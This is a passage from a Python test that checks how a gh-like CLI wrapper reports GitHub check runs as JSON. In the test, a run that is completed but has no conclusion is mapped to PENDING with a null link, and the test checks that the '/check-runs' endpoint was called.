             '--json', 'name,state,link']
    # The fake executor returns one completed run with no conclusion, which
    # the mapping intentionally cannot claim succeeded.
    assert guest.main(words, alias='gh') == 0
    assert json.loads(capsys.readouterr().out) == [
        {'name': 'lean', 'state': 'PENDING', 'link': None},
    ]
    assert session.h.executor.calls[-1][0].path.endswith('/check-runs')
